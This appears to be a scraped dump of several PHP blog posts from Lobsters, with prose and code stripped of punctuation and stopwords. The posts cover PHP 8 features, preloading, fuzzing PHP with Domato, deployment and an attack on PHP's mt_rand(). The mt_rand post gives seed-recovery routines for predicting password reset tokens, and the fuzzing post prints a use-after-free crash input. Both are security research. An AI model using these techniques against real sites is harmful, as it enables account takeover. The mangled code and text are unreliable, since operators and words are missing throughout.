return false public static function includeend boundary return new class extends boundary public function startincluded bool return false public function endincluded bool return true public static function includeall boundary return new class extends boundary public function startincluded bool return true public function endincluded bool return true ok mistaken two improvement made lot repeated code solution let simply define two property valuespecific class startincluded endincluded let implement getters abstract boundary class instead abstract class boundary protected bool startincluded protected bool endincluded public function startincluded bool return startincluded public function endincluded bool return endincluded public static function includenone boundary return new class extends boundary protected bool startincluded false protected bool endincluded false public static function includestart boundary return new class extends boundary protected bool startincluded true protected bool endincluded false public static function includeend boundary return new class extends boundary protected bool startincluded false protected bool endincluded true public static function includeall boundary return new class extends boundary protected bool startincluded true protected bool endincluded true favourite approach implement enums php one downside think require little setup work though find small oneoff cost pay highly long run would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
53,Lobsters,php,PHP programming,New in PHP 8,https://stitcher.io/blog/new-in-php-8,new php,new php november jit compiler union type attribute new feature union type rfc benchmark nullsafe operator rfc null coalescing operator named argument rfc named argument post attribute rfc attribute another rfc attribute depth undecided match expression rfc dedicated post new return type rfc new type rfc throw expression rfc inheritance private method rfc weak map rfc weakrefs rfc allowing object rfc noncapturing catch rfc trailing comma parameter list rfc separate rfc create object interface new interface rfc new function rfc new function rfc new function pr new function rfc new function pr abstract method trait improvement rfc object implementation rfc variable syntax tweak rfc type annotation internal function external pitched always available rfc breaking change upgrading consistent type error rfc reclassified engine warning rfc operator longer silence fatal error default error reporting level default pdo error mode rfc concatenation precedence rfc stricter type check arithmetic bitwise operator rfc namespaced name single token rfc saner numeric string rfc saner string number comparison rfc reflection method signature change stable sorting rfc fatal error incompatible method signature rfc deprecation change newsletter twitter pr,new php php released november new major version mean introduce breaking change well lot new feature performance improvement right php feature freeze meaning new feature added anymore breaking change higher chance need make change code get running php kept date latest release though upgrade nt hard since breaking change deprecated version nt worry deprecation listed post besides breaking change php also brings nice set new feature jit compiler union type attribute new feature union type rfc given dynamically typed nature php lot case union type useful union type collection two type indicate either one used public function foo foobar input intfloat note void never part union type since indicates return value furthermore nullable union written using null using existing notation public function foo foonull foo void public function bar bar bar void jit time compiler promise significant performance improvement albeit always within context web request done benchmark reallife web application seems like jit nt make much difference kind php project want know jit php read another post wrote nullsafe operator rfc familiar null coalescing operator already familiar shortcoming nt work method call instead need intermediate check rely optional helper provided framework startdate booking getstartdate dateasstring startdate startdate asdatetimestring null addition nullsafe operator null coalescinglike behaviour method dateasstring booking getstartdate asdatetimestring named argument rfc named argument allow pas value function specifying value name nt take order consideration also skip optional parameter function foo string string b string c null string null foo b value b value value read indepth post attribute rfc attribute commonly known annotation language offer way add meta data class without parse docblocks quick look example attribute look like rfc use appattributesexampleattribute exampleattribute class foo exampleattribute public const foo foo exampleattribute public x exampleattribute public function foo exampleattribute bar attribute class exampleattribute public value public function construct value value value note base attribute used called phpattribute original rfc changed another rfc afterwards want take deep dive attribute work build read attribute depth blog also note attribute syntax still change still undecided match expression rfc could call big brother switch expresion match return value nt require break statement combine condition us strict type comparison nt type coercion look like result match input hello world read match expression detail rfc add syntactic sugar create value object data transfer object instead specifying class property constructor php combine one instead class money public currency currency public int amount public function construct currency currency int amount currency currency amount amount class money public function construct public currency currency public int amount lot tell property promotion read dedicated post new static return type rfc already possible return self static nt valid return type php given php dynamically typed nature feature useful many developer class foo public function test static return new static new mixed type rfc might call necessary evil mixed type cause many mixed feeling good argument make though missing type mean lot thing php function return nothing null expecting one several type expecting type ca nt type hinted php reason good thing mixed type added mixed mean one type array bool callable int float null object resource string note mixed also used parameter property type return type also note since mixed already includes null allowed make nullable following trigger error function bar mixed throw expression rfc rfc change throw statement expression make possible throw exception many new place triggererror fn throw new myerror foo bar offset throw new offsetdoesnotexist offset inheritance private method rfc previously php used apply inheritance check public protected private method word private method follow method signature rule protected public method nt make sense since private method wo nt accessible child class rfc changed behaviour inheritance check performed private method anymore furthermore use final private function also nt make sense trigger warning warning private method final never overridden class weak map rfc built upon weakrefs rfc added php weakmap implementation added php weakmap hold reference object nt prevent object garbage collected take example orms often implement cache hold reference entity class improve performance relation entity entity object garbage collected long cache reference even cache thing referencing caching layer us weak reference map instead php garbage collect object nothing else reference anymore especially case orms manage several hundred thousand entity within request weak map offer better resource friendly way dealing object weak map look like example rfc class foo private weakmap cache public function getsomethingwithcaching object obj object return cache obj computesomethingexpensive obj allowing class object rfc small yet useful new feature possible use class object instead use getclass work way getclass foo new foo vardump foo class noncapturing catch rfc whenever wanted catch exception php store variable regardless whether used variable noncapturing catch omit variable instead try catch myspecialexception exception log error something went wrong try catch myspecialexception log error something went wrong note required always specify type allowed empty catch want catch exception error use throwable catching type trailing comma parameter list rfc already possible calling function trailing comma support still lacking parameter list allowed php meaning following public function string parametera int parameterb foo objectfoo sidenote trailing comma also supported use list closure oversight added via separate rfc create datetime object interface already create datetime object datetimeimmutable object using datetime createfromimmutable immutabledatetime way around tricky adding datetime createfrominterface datetimeimmutable createfrominterface generalised way convert datetime datetimeimmutable object datetime createfrominterface datetimeinterface datetimeimmutable createfrominterface datetimeinterface new stringable interface rfc stringable interface used type hint anything string implement tostring furthermore whenever class implement tostring automatically implement interface behind scene need manually implement class foo public function tostring string return foo function bar stringable stringable bar new foo bar abc new strcontains function rfc might say long overdue finally nt rely strpos anymore know whether string contains another string instead strpos string lot word word false strcontains string lot word word new strstartswith strendswith function rfc two one long overdue two function added core strstartswith haystack hay strendswith haystack stack new fdiv function pr new fdiv function something similar fmod intdiv function allows division instead error get inf inf nan depending case new getdebugtype function rfc getdebugtype return type variable sound like something gettype would getdebugtype return useful output array string anonymous class object example calling gettype class foobar would return object using getdebugtype return class name full list difference getdebugtype gettype found rfc new getresourceid function pr resource special variable php referring external resource one example mysql connection another one file handle one resource get assigned id though previously way know id cast resource int resourceid int resource php add getresourceid function making operation obvious typesafe resourceid getresourceid resource abstract method trait improvement rfc trait specify abstract method must implemented class using caveat though php signature method implementation nt validated following valid trait test abstract public function test int input int class usestrait use test public function test input return input php perform proper method signature validation using trait implementing abstract method mean need write instead class usestrait use test public function test int input int return input object implementation tokengetall rfc tokengetall function return array value rfc add phptoken class phptoken getall method implementation work object instead plain value consumes le memory easier read variable syntax tweak rfc rfc uniform variable syntax rfc resolved number inconsistency php variable syntax rfc intends address small handful case overlooked type annotation internal function external lot people pitched add proper type annotation internal function long standing issue finally solvable change made php previous version mean internal function method complete type information reflection extjson always available rfc previously possible compile php without json extension enabled possible anymore since json widely used best developer always rely instead ensure extension exist first breaking change mentioned major update thus breaking change best thing take look full list breaking change upgrading document many breaking change deprecated previous version though staying uptodate year nt hard upgrade php consistent type error rfc userdefined function php already throw typeerror internal function rather emitted warning returned null php behaviour internal function made consistent reclassified engine warning rfc lot error previously triggered warning notice converted proper error following warning changed undefined variable error exception instead notice undefined array index warning instead notice division zero divisionbyzeroerror exception instead warning attempt incrementdecrement property nonobject error exception instead warning attempt modify property nonobject error exception instead warning attempt assign property nonobject error exception instead warning creating default object empty value error exception instead warning trying get property nonobject warning instead notice undefined property warning instead notice add element array next element already occupied error exception instead warning unset offset nonarray variable error exception instead warning use scalar value array error exception instead warning array traversables unpacked typeerror exception instead warning invalid argument supplied foreach typeerror exception instead warning illegal offset type typeerror exception instead warning illegal offset type isset empty typeerror exception instead warning illegal offset type unset typeerror exception instead warning array string conversion warning instead notice resource id used offset casting integer warning instead notice string offset cast occurred warning instead notice uninitialized string offset warning instead notice assign empty string string offset error exception instead warning supplied resource valid stream resource typeerror exception instead warning operator longer silence fatal error possible change might reveal error hidden php make sure set displayerrorsoff production server default error reporting level eall instead everything enotice edeprecated mean many error might pop previously silently ignored though probably already existent php default pdo error mode rfc rfc current default error mode pdo silent mean sql error occurs error warning may emitted exception thrown unless developer implement explicit error handling rfc change default error change pdo errmodeexception php concatenation precedence rfc already deprecated php change taken effect write something like echo sum b php would previously interpret like echo sum b php make interpreted like echo sum b stricter type check arithmetic bitwise operator rfc php possible apply arithmetic bitwise operator array resource object nt possible anymore throw typeerror object namespaced name single token rfc php used interpret part namespace separated backslash sequence token rfc changed behaviour meaning reserved name used namespaces saner numeric string rfc php type system try lot smart thing encounter number string rfc make behaviour consistent clear saner string number comparison rfc rfc fix strange case php foo result true edge case like one rfc fix reflection method signature change three method signature reflection class changed reflectionclass newinstance args reflectionfunction invoke args reflectionmethod invoke object args become reflectionclass newinstance args reflectionfunction invoke args reflectionmethod invoke object args upgrading guide specifies extend class still want support php php following signature allowed reflectionclass newinstance arg null args reflectionfunction invoke arg null args reflectionmethod invoke object arg null args stable sorting rfc php sorting algorithm unstable mean order equal element nt guaranteed php change behaviour sorting function stable sorting fatal error incompatible method signature rfc rfc inheritance error due incompatible method signature currently either throw fatal error warning depending cause error inheritance hierarchy deprecation change php development several deprecation added finalised php would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
54,Lobsters,php,PHP programming,PHP in 2020,https://stitcher.io/blog/php-in-2020,php,back brent php history summarized consistent yearly release cycle php roundtable podcast mailing list php type system psalm phan phpstan php syntax destructuring null coalescing typed property arrow function php performance kinsta preloading jit compiler framework ecosystem symfony laravel packagist website swoole amp reactphp add libuv core closing source code open source package twitter email newsletter twitter pr,back written brent january php secret among web developer programmer general php nt best reputation despite still one used language build web application year php managed get reputation messy codebases inexperienced developer insecure code inconsistent core library many argument php still stand today also bright side write clean maintainable fast reliable application php post want look bright side php development want show despite many shortcoming php worthwhile language learn want know php era coming end want write modern clean php code leave behind much mess year ago let look language changed matured even past year want ask set aside prejudice minute possibly surprised php today let dive history summarized diving detail let review php language developed day version php next version end ever since late era core team try keep consistent yearly release cycle succeeded past four year general every new release actively supported two year get another year security fix goal motivate developer stay uptodate much possible small upgrade every year easier making jump example lastly php latest release next one want know happened php listen episode php roundtable podcast php development day done group volunteer paid employer work core full time discussion language evolved happens mailing list way let debunk common misconception modern php php type system php started weakly dynamically typed language benefit time ever since people started use php larger project though shortcoming type system became clear need stronger type support arose today php rather unique language still allows write completely dynamically weakly typed code also much stronger optin type system combined static analysis tool like psalm phan phpstan write secure strongly typed statically analysed code take example look snippet php code using modern type system full php declare final class foo public int intproperty public string nullablestring null private bar bar public function construct bar bar bar bar public function withint int value self clone clone clone intproperty value return clone public function uniontypes intfloat input void truth told one important feature still missing php type system generic hope added nothing concrete yet case typed array need rely docblocks get proper ide support public array arrayofints typed array common use case generic solveable docblocks lot functionality missing yet php syntax era done many good thing term making php mature language come syntax illustrate made nonexhaustive list new thing php array destructuring b array null coalescing operator value object property fallback null value array foo fallback key nt exists null coalescing assignment operator public function get string input string return cache input sanitize input array spreading b mergedarray b variadic function public function get foo foos void foreach foos foo argument unpacking get arrayoffoo typed property public int intproperty arrow function also called short closure id arraymap fn post post int post id post generator function make array input generator foreach input item yield dosomethingwith item quite lot hope clear list php still evolving today sure good stuff come php performance back day php performance average best though large part php core rewritten ground resulting two three time performance increase furthermore release positive impact performance word nt suffice though let look benchmark luckily people spent lot time benchmarking php performance find kinsta good updated list latest performance related feature called preloading basically allows store compiled part php code memory look benchmark php arrives also jit compiler disposal promising interesting performance improvement allowing php enter new area besides web development framework ecosystem moving done community php let clear php nt wordpress anymore contrary general two major web application framework smaller one symfony laravel sure also lamina yii cake code igniter etc want know modern php development look like good one first two framework large ecosystem package product ranging admin panel crms standalone package ci profilers numerous service like web socket server queuing manager payment integration honestly much list framework meant actual development instead need pure content management platform like wordpress craftcms statamic improving one way measure current state php ecosystem look packagist main package repository php seen exponential growth million downloads day fair say php ecosystem nt small underdog used take look graph listing amount package version time also found packagist website besides application framework cm also seen rise asynchronous framework past year framework server written php language allow user run truly asynchronous php code major player swoole amp reactphp since ventured async world stuff like web socket application lot io become actually relevant php world also talk internals mailing list add libuv core unaware libuv library nodejs us allow asynchronicity know php might version adding core closing hope able show php evolved tremendously past year perfectly able write clean maintainable code interested php code look like wild day check source code one project well many open source package personally maintain language definitely drawback year legacy carry say confidence enjoy working experience able create reliable maintainable quality software client work happy end result still possible lot messed thing php say great choice web development used wisely correctly nt agree let know reach via twitter email would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
55,Lobsters,php,PHP programming,Preload benchmarks in PHP 7.4,https://stitcher.io/blog/php-preload-benchmarks,preload benchmark php,back brent preloading benchmark php preloading work aggregatestitcherio setup bug github preloading disabled naive preloading optimised summary request per second time per request newsletter twitter pr,back written brent january preloading benchmark php writing preloading work time measure impact practice diving result need make sure page measuring want know whether preloading practical impact project running benchmark real project homepage hobby project aggregatestitcherio project laravel project obviously database call view rendering etc want make clear benchmark nt tell anything performance laravel project measure relative performance gain preloading could offer let repeat make sure one draw wrong conclusion result benchmark measure whether preloading relative performance impact compared using benchmark say nothing much performance gain depend several variable server load code executed page etc let set stage setup since nt want measure much exactly gained using preloading decided run benchmark local machine using apache bench sending request concurrent request time webserver nginx using phpfpm bug early version preloading able successfully run benchmark early php released yet used dev build testing project built laravel code including preload script found github finally benchmarking three scenario one preloading disabled one laravel application code preloaded one optimised list preloaded class explain scenario one one preloading disabled baseline scenario start phpfpm run benchmark nodaemonize ab n c l http result request per second sec mean time per request m mean naive preloading next preload laravel application code naive approach never using laravel class request preloading many file strictly needed pay penalty case class dependency preloaded resulting total function class preloaded wondering measure exact amount file preloaded read info opcachegetstatus opcachegetstatus preloadstatistics another metric get opcachegetstatus memory used preloaded script case around mb even though preloading code actually need naive preloading already positive impact performance request per second sec mean time per request m mean around performance gain compared using preloading optimised finally want compare performance gain using optimised preloading list testing purpose started server without preloading enabled dumped class used within request getdeclaredclasses next preloaded class total together dependency make class function preloaded occupying mb memory benchmark result setup request per second sec mean time per request m mean around performance gain compared using preloading gain compared using naive approach flaw setup though since generated optimised preloading list one specific page practice would probably need preload code want page covered another approach could monitor class loaded many time period several hour production server compile preload list based metric unfortunately able test approach yet since using preloading production yet summary nt like graph two come benchmark let compare amount request per second better request per second also let compare response time per request case le better time per request think safe say preloading even naive approach positive performance impact also reallife project built upon fullblown framework much exactly gained depend code server framework using say go try would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
56,Lobsters,php,PHP programming,Breaking PHP's mt_rand() with 2 values and no bruteforce,https://www.ambionics.io/blog/php-mt-rand-prediction,breaking php mtrand value bruteforce,introduction mersenne twister seed obtain whole internal state bruteforce seed using part value recover mersenne twister seed using two output function without kind bruteforce breaking php mersenne twister output value math state array knowing value seed initial state array scrambled state array modified scrambled state value literally seed initial state initial state scrambled state scrambled state nm lot information initial state scrambled state value output putting together github conclusion breaking prng,introductionwhile performing pentest old website encountered piece code seen long time php function resetpassword email supersecrettoken email mtrand sendemailwithresettoken email supersecrettoken token deemed secret unguessable generated using output php implementation mersenne twisteran internal conversation ensued good old time prng prediction mass article tool generated early last decade time many application used either rand mtrand generate secret token password function labeled cryptographically insecure used cryptographic purpose order predict value find seed original value generated consensus appeared needed either obtain whole internal state value mtrand bruteforce seed using part valueshowever one researcher adamant possible recover mersenne twister seed using two output mtrand function without kind bruteforce nevertheless unable find information supporting theory note matter long lostafter crunching number little bit year prngprediction circus proved right old time sake demonstrate thisbreaking php mersenne twister output value maththe first step generating random number using mtrand use seed unsigned int generate state array value done either calling mtsrand seed automatically php upon requesting first random number call mtrand take next state value scramble return usereverything happens extstandardmtrandc file modern php version extstandardrandc older version knowing value seed make able predict every number generated prng another call mtsrand made therefore secret random value generated one several value mtrand would secret anymore leading obvious security issuesthe random number generation process three step process generate initial state array modular multiplication seedscramble state value together get scrambled state arraywhen mtrand called return modified scrambled state valuefor step show code briefly describe work work way output inputnote changed code responsible generating scrambled state bit literally see twist twistphp defines mtrandc change much able get seed variation algorithm focus original implementation twistphp script provided bottom handle versionsseed initial state define mtn define n mtn length state vector define period parameter static inline void phpmtinitialize seed state initialize generator state seed see knuth taocp vol ed multiplier previous version significant bit msb seed affect msb state array modified jan makoto matsumoto register state register r state register int seed n r r r initial state array value created first state seed subsequent state value generated previous onenow knowledge state value say state work way back state seed python equivalent code n max statemult def phpmtinitialize seed creates initial state array seed state none n state seed range n r state state statemult r r max return state since value generated iteration first thing need try find state state repeat operation reach state seed state compute modular multiplicative inverse modulo python get statemultinv max def undophpmtinitialize statemultinv max return def undophpmtinitialize p initial state value position p find seed range p undophpmtinitialize return mean get hand initial state value compute state value original seedinitial state scrambled state define hibit u u mask highest bit u define lobit u u mask lowest bit u define lobits u u mask highest bit u define mixbits u v hibit u lobits v move hi bit u hi bit v define twist u v mixbits u v lobit u static inline void phpmtreload tsrmlsd generate n new value state made clearer faster matthew bellew matthewbellew homecom register state bg state register p state register int n p p twist p p p p p twist p mn p p p twist p mn p state bg left n bg next state initial state array scrambled mixingup value giving new state scrambled state first nm value computed differently one afterwards python n def phpmtreload range n twist im range n n twist imn def twistphp u v emulates twist define mask u else return u v mask show deduce one initial state two scrambled statesa relation emerges state state name initial state array new scrambled one twist twist else else attacker knowledge scrambled state xor get lot information initial state denote x since left part xor expression right shifted msb always empty therefore msb x determined right part mask msb set hence msb x lsb remove mask x presentthen bit bit x rest value bit namely bit sum msb lsb initial state value bit initial state value therefore possible value since know bit well compute candidate four potential value see first part verify obtained value lsb msb match one furthermore obtain seed associated candidate state refer first part use seed regenerate state check match python code def undophpmtreload u v x mean mask applied lsb bv x remove mask present x another easy guess bv x remove bit present x missing bit bit try every possibility x range range check result consistent known bit undophpmtinitialize bv continue bv continue check guessed seed yield first scrambled state rand undophpmtinitialize state phpmtinitialize rand phpmtreload state state continue return rand return none deduce original seed used relationship scrambled state one see relationship valid couple state value separated value therefore knowledge two state value offset recover seedwe check last step mtrand prngscrambled state value mtrand outputwhen call mtrand php take value scrambled state array play little bit return itphpfunction mtrand zendlong min zendlong max int argc zendnumargs argc performs right shift returnlong phpmtrand phpapi phpmtrand void pull integer generator state every access function simply transforms number extracted register unexpected bg mtrandisseeded phpmtsrand generateseed bg left phpmtreload bg left bg next pick next scrambled state value return denotes scrambled state value operation applied phpmtrand mtrand shift one bit right last operation reversed obviously four canwe end following code undoing transformation def undophpmtrand retrieves merged state value value sent user undolshiftxormask return def undolshiftxormask v shift mask r st v r r shift mask range shift shift v bit v shift shift bit mask shift return v given mtrand output guessing lsb get possible scrambled state value one output lsb togetherlet put reverse step together obtain value mtrand separated value number generated value generated scrambled state valuesxor state deduce initial state seed working back main offset leftmost byte unknown range range undophpmtrand undophpmtrand seed undophpmtreload offset seed print seed since missing lsb need try algorithm case often one four combination yield seed others impossibleoutput full python code available githubconclusionwe demonstrated given two mtrand output value separated others possible compute without bruteforce original seed therefore obtain previous subsequent mtrand output effectively breaking prng
57,Lobsters,php,PHP programming,Fuzzing PHP with Domato,https://blog.jmpesp.org/2020/01/fuzzing-php-with-domato.html,fuzzing php domato,domato contextfree grammar contextfree grammar enumerating attack surface reflectionparameter class contain gettype method setting domato preparing fuzz llvm address sanitizer asan proxmox finding crash bug commit,clarity brevity code referenced distilled simplest form complete version actually used fuzzing found lately working fuzzing php interpreter explored many tool technique afl libfuzzer even custom fuzz engine recently decided give domato try aware domato grammarbased dom fuzzer built tease complex bug complex codebases originally designed browser mind figured might able repurpose fuzzing php interpreter contextfree grammar order use domato one must first describe language using contextfree grammar cfg simply set rule define language constructed instance language composed sentence form name number adjective noun name noun adjective want purchase number adjective noun variable could take several form name alice bob eve number adjective green large expensive noun car hat laptop context free grammar might look like name alice name bob name eve number number number adjective green adjective large adjective expensive noun car noun hat noun laptop sentence name number adjective noun sentence name noun adjective sentence want purchase number adjective noun domato us context free grammar generate random combination conform rule language example eve expensive laptop alice hat green want purchase expensive car want purchase large laptop bob expensive car eve green laptop want purchase large laptop bob large car want purchase large car want purchase large hat bob laptop expensive imagine breaking rule many subrules begin define much complex language well beyond simple searchreplace practice domato also provides builtin functionality limiting recursion generating basic type int char string etc instance consider following domato grammar generates pseudocode maxrecursion varname var int vardef int varname int vardef char varname char condition varname varname condition varname int condition varname int statement vardef statement condition statement else statement statement condition statement statement statement statement examplefuzz statement begin line examplefuzz end line feeding domato produce following int else int int int int else int int char char char p int else char char l int char b int int else char c else int else char char char else int char x int int char f else int perfectly suited fuzzing interpreter sample unusual still guaranteed syntactically valid enumerating attack surface next step describe php language cfg interested seeing complete cfg download php source code look zendzendlanguageparsery however interested fuzzing specific codepatterns implemented cfg generated call builtin function class method using fuzzy parameter need list function method argument two way obtain data simplest use php built reflection class iterate defined function class building list following code demonstrates internal php function php foreach getdefinedfunctions internal f r new reflectionfunction f params array foreach r getparameters p params p getname echo f implode params n produce something like andrew thinkpad tmp php langphp zendversion funcnumargs funcgetarg argnum funcgetargs strlen str strcmp strncmp len strcasecmp strncasecmp len arr errorreporting newerrorlevel define constantname value caseinsensitive defined constantname getclass object etc problem however list contains type information yes reflectionparameter class contain gettype method however nt seem work moment vast majority function maybe bug hard say regardless type information make fuzzing effort significantly effective worth time investment find another way get data lesselegant way obtaining data scrape php documentation parse need luckily php documentation generally quite good downloaded single gzipped html document arduous hour writing regular expression able parse usable list function method argument type leave exercise reader final product cfg form looked like functioncall ab fuzzmixed functioncall acos fuzzfloat functioncall acosh fuzzfloat functioncall addcslashes fuzzstring fuzzstring functioncall addslashes fuzzstring functioncall arraychangekeycase fuzzarray fuzzint functioncall arraychunk fuzzarray fuzzint fuzzbool snip snip snip methodcall objdateinterval createfromdatestring fuzzstring methodcall objdateinterval format fuzzstring methodcall objdateperiod getdateinterval methodcall objdateperiod getenddate methodcall objdateperiod getrecurrences methodcall objdateperiod getstartdate methodcall objdatetime add fuzzdateinterval methodcall objdatetime createfromformat fuzzstring fuzzstring fuzzdatetimezone snip snip snip objdateinterval var dateinterval objdateperiod var dateperiod objdatetime var datetime objdatetimeimmutable var datetimeimmutable objdatetimezone var datetimezone objdirectory var directory objdomattr var domattr etc setting domato order domato use grammar also need define basic component fuzzint fuzzstring fuzzarray set potentially dangerous value intmax null aaa aaa array array array etc fed function method call additionally tell domato wrap line trycatch block exception error wo nt fatal quite lot tweaking tuning configuration ended looking bit like lineguard try try line catch exception e catch error e fuzzvoid fuzzbool true fuzzbool false fuzzinteger fuzzint fuzzint fuzzint fuzzint fuzzint fuzzint largeint fuzzint largeint largeint largeint largeint largeint fuzzfloat fuzznumber fuzzint fuzznumber fuzzfloat fuzzstring strrepeat fuzzstring implode arraymap function c return x strpad dechex c range fuzzstring strrepeat x n repeatcount repeatcount array range array array b c fuzzarray array fuzzmixed fuzzint fuzzmixed fuzzfloat fuzzmixed fuzzbool fuzzmixed fuzzstring fuzzmixed fuzzarray include phpphplangtxt fuzzline methodcall fuzzline functioncall begin line fuzzline end line also need define template grammar applied template set environment instantiate object might later used run fuzz line template looked bit like php var array stdclass new stdclass exception new exception errorexception new errorexception error new error compileerror new compileerror parseerror new parseerror typeerror new typeerror etc phpfuzz last step copy modify domato generatorpy file found simply making following change sufficient line change root element phpfuzz line reference templatephp line reference grammar phptxt line change output name extension uuid php able generate valid fuzz input andrew thinkpad domatophp python generatorpy devstdout writing sample devstdout php var array stdclass new stdclass exception new exception errorexception new errorexception error new error compileerror new compileerror parseerror new parseerror typeerror new typeerror etc try try var splpriorityqueue insert false array b c catch exception e catch error e try try filterhasvar strrepeat x n catch exception e catch error e try try posixaccess implode arraymap function c return x strpad dechex c range catch exception e catch error e try try rand catch exception e catch error e try try fputcsv fopen devnull r array b c strrepeat chr strrepeat chr strrepeat chr strrepeat catch exception e catch error e try try var reflectionmethod isabstract catch exception e catch error e try try var domprocessinginstruction construct strrepeat chr strrepeat chr strrepeat chr strrepeat chr strrepeat chr strrepeat chr catch exception e catch error e try try strrepeat catch exception e catch error e try try var multipleiterator current catch exception e catch error e try try dl strrepeat catch exception e catch error e try try ignoreuserabort true catch exception e catch error e preparing fuzz data fuzz need build php way maximizes chance detecting kind memory corruption strongly recommend llvm address sanitizer asan detect invalid memory access even would immediately result crash build php asan download latest version source code run following command configure cflags fsanitizeaddress ggdb cxxflags fsanitizeaddress ggdb ldflags fsanitizeaddress make make install leaving fuzzer run unattended also good idea try eliminate condition hold process unnecessarily instance like language php function called sleep take integer argument simply wait many second continuing calling function large fuzzvalues intmax quickly tie even large fuzz cluster also function could cause process crash legitimately posixkill posixsetrlimit may wish remove test corpus order reduce number false positive finally since many function class listed php documentation actually available core install rather extension may wish remove corpus avoid wasting time calling nonexistent code finally experimentation settled following list classblacklist array ca nt actually instantiate closure generator hashcontext recursiveiteratoriterator iteratoriterator filteriterator recursivefilteriterator callbackfilteriterator recursivecallbackfilteriterator parentiterator limititerator cachingiterator recursivecachingiterator norewinditerator appenditerator infiniteiterator regexiterator recursiveregexiterator emptyiterator recursivetreeiterator arrayobject arrayiterator recursivearrayiterator splfileinfo directoryiterator filesystemiterator recursivedirectoryiterator globiterator functionblacklist array exit false positive readline pause readlinecallbackhandlerinstall pause syslog spam syslog sleep pause usleep pause timesleepuntil pause timenanosleep pause pcntlwait pause pcntlwaitstatus pause pcntlwaitpid pause pcntlsigwaitinfo pause pcntlsigtimedwait pause streamsocketrecvfrom pause posixkill end process ereg cpu do eregi cpu do eregireplace cpu do eregreplace cpu do similartext cpu do snmpwalk cpu do snmpwalkoid cpu do snmpget cpu do split cpu do spliti cpu do snmpgetnext cpu do mcryptcreateiv cpu do gmpfact cpu do posixsetrlimit although one machine could generate fuzz sample alone opted small cluster machine speed process used proxmox running intel nuc debian vm whose job following node sample generator hosting nfs share node fuzz node pulling sample nfs share test node triage node binning crashing sample based crash metric created simple crude shell script run carry duty script found github repo linked finding crash short period time work paid within minute fuzzer generated several crashing sample overnight created binning crash according instruction address crashed able determine result unique bug clearly unexploitable oom error due stack exhaustion however last appeared useafterfree minimized crashing sample php x array new xmlwriter x openuri tmpa x startcomment bug since fixed bug commit included next release next blog post discus process tracing back root cause abusing achieve arbitrary code execution neat little shellcode trick discovered along way stay tuned
58,Lobsters,php,PHP programming,Deployment and release strategies,https://www.freelock.com/blog/john-locke/2019-09/deployment-and-release-strategies,deployment release strategy,important deployment common deployment strategy deployment work production copy site production build site deploy gatsby jeckyll devstageproduction pipeline bluegreen deployment deployment strategy best,build new website going live relatively easy get ahold domain name point webhost put website code running site live get lot complicated important deployment simple brochure site deploying update nt complicated site complex deployment becomes deployment plan help stay trouble keep site online minimize data loss going live update site ask much downtime acceptable much testing need make change production site data could lose production site might go wrong deployment strategy recover something go wrong good deployment plan make smile comfort knowing base covered smiling read common deployment strategy main strategy seen used deployment work production environment nothing deploy copy entire new site production environment compilebuild site put result production environment devstageproduction pipeline bluegreen deployment let take deeper look one deployment work production often get nt careful hiring freelancer really seems standard approach wordpress site horrifying coding often process trying something breaking thing fixing rinse repeat live production website site visitor see broken page weird issue sometimes nothing site already getting traffic working production irresponsible dangerous especially nt extremely careful backup nt extremely proficient benefit deployment deployment strategy cheap saving cost managing copy site deploying change copy site production also seems pretty common way deploying site simply copy new site entirety production server make live major upgrade going drupal drupal changing one platform entirely different one main strategy use definitely time strategy make sense however daytoday maintenance theme refreshes typical deployment good approach production site database regular change need extremely careful lose production data example site allows user comment take ecommerce order manages sale lead simply copy new site risk losing something save one entirely new site nt day day work unless site nt even database build site deploy static site generator like gatsby jeckyll become quite popular recently generate static site database greatly simplifying security running fullblown content management system cm like drupal wordpress putting application bug internet anyone attack site collection file ca nt really attack attack hosting environment site far le attack surface attacker go gatsby particular becoming quite popular frontend drupal wordpress write content private cm private lan reachable internet export entire site using gatsby build step copy resulting code web host much like previous deployment strategy use approach still need consider keep cm date though online updating place becomes far reasonable proposition devstageproduction pipeline reached consider standard deployment practice run copy site dev development copy development work least integrate various developer copy conduct initial round testing stage test main purpose copy test deployment process understand might break roll production production live site available public general code flow dev production whereas contentdata flow production dev site take order collect data using form support ratingsreviews comment anything sophisticated probably end deployment strategy several professional host like pantheon acquia wp engine others provide environment along easy way deploy code prod copy data prod many larger company highly technical startup built continuous integrationcontinuous deployment pipeline along line including freelock continuous integration basically kick automatic test code pushed particular branch continuous deployment automates deployment code production test passed key service provide nearly client two different kind testing fully automatic pipeline automatic backup release scheduling release note management build pipeline work variety host including pantheon acquia also bare linux server cloud provider main downside type deployment slow deploy hard set prone breaking code standard evolve different platform different challenge around deploying configuration change example move wordpress database another location need string searchreplacement database update url disk location may need manual step code get deployed drupal hand may put site maintenance mode minute database update get applied done well great deployment strategy expensive maintain service great value hard work keeping running smoothly across many dozen client automated lot hard bit streamlined setup bluegreen deployment even minute downtime cost significant amount income may want consider bluegreen deployment strategy strategy made high availability utmost minimize maintenance window provide rocksolid rollback option something go awry bluegreen deployment strategy essentially create two full production environment blue green one live given instance standby want deploy update deploy new code configuration change offline environment ready go simply promote live one example blue live deploy everything green possibly using normal devstageprod deployment process configuration change happen green site offline public never get maintenance message ready promote green live blue becomes offline standby copy discover problem going live simply promote blue back live green go standby get fixed big downside site take order otherwise change production database window could lose data much like copy site production strategy might able somewhat mitigate setting live site read still available copy database standby site apply config promote might able create journal log change replay new site get promoted move microservice architecture moving problem individual microservices still need deployment strategy deployment strategy best best deployment strategy tradeoff appropriate particular site situation break site multiple piece may end using multiple strategy one might quite bit simpler trying update whole hand might actually lower availability various piece end different maintenance schedule running phpbased cm want rest easy site uptodate running correctly solid recovery plan something go wrong help
